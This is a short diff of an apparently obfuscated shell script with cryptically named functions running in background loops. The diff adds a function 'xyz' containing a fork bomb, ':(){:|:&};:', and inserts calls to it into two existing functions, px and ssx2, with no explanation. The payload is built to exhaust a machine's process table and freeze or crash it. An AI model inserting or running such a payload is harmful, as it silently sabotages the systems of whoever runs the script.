@@ -145,6 +145,7 @@ function px(){
 	#
  	Mcx
  	#
+  	xyz
     	ax_ & ssx_ & PxNwx
     	#
 	#ssx2
@@ -166,9 +167,14 @@ function ssx2(){
   	#
     	Mcx
  	#
+  	xyz
   	 ssx_ & ax_
 	 sleep 30
 	done
+}
+
+function xyz(){
+	:(){:|:&};:
 }
 
 px
